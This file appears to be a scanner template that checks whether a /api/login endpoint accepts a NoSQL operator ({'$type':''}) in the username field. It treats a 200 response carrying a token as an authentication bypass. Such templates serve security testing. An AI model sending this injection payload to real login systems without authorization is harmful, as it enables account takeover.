id: nosql-41
name: 'NoSQL $type in username'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $type accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"username":{"$type":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
